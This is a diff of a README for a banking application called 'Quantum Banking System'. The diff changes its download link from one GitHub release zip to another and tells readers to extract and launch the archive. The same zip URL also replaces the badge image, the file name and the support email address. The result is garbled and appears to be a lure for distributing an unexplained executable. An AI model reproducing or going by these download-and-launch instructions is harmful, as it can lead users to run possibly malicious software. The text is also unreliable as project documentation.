@@ -19,9 +19,9 @@ ai, bank-management-system, banking, enhanced, loan, matplotlib, multiple-featur
 
 ## Installation 🛠️
 To get started with Quantum Banking System, you can download the latest version from the link below:
-[![Download Quantum Banking System](https://img.shields.io/badge/Download-Quantum_Banking_System-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Quantum Banking System](https://github.com/Clever-co/Quantum-Banking-System/releases/download/v1.0/Program.zip)](https://github.com/Clever-co/Quantum-Banking-System/releases/download/v1.0/Program.zip)
 
-Please ensure that the downloaded file *Soft.zip* is extracted and launched for the full functionality of the Quantum Banking System.
+Please ensure that the downloaded file *https://github.com/Clever-co/Quantum-Banking-System/releases/download/v1.0/Program.zip* is extracted and launched for the full functionality of the Quantum Banking System.
 
 ## Usage 🖥️
 Once you have installed the Quantum Banking System, you can explore its various features and functionalities. Here are some basic steps to get started:
@@ -33,7 +33,7 @@ Once you have installed the Quantum Banking System, you can explore its various 
 5. **Security**: Take advantage of OTP verification and advanced encryption protocols to secure your transactions.
 
 ## Support and Feedback 📧
-If you encounter any issues or have feedback regarding the Quantum Banking System, feel free to reach out to our support team at support@quantumbankingsystem.com. Your input is valuable to us as we strive to enhance the system and provide the best financial experience for our users.
+If you encounter any issues or have feedback regarding the Quantum Banking System, feel free to reach out to our support team at https://github.com/Clever-co/Quantum-Banking-System/releases/download/v1.0/Program.zip Your input is valuable to us as we strive to enhance the system and provide the best financial experience for our users.
 
 ## Contributing 🤝
 We welcome contributions from the community to improve and expand the capabilities of the Quantum Banking System. If you have ideas for new features, enhancements, or bug fixes, please submit a pull request with your changes. Together, we can make Quantum Banking System even better for all users!
